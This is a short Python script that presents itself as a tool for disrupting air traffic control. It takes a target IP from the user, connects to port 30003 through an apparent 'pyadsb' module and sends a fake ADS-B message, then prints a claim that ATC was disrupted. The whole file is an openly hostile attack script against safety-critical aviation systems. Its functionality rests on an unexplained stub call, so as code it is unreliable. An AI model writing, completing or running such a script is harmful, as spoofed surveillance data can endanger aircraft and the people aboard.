from pyadsb import ADSB
import sys

def disrupt_atc(target):
    adsb = ADSB(target, 30003)
    adsb.send_fake_message()
    print(f"Disrupted ATC at {target}")

def main():
    target = input("Enter target IP: ")
    disrupt_atc(target)

if __name__ == "__main__":
    main()
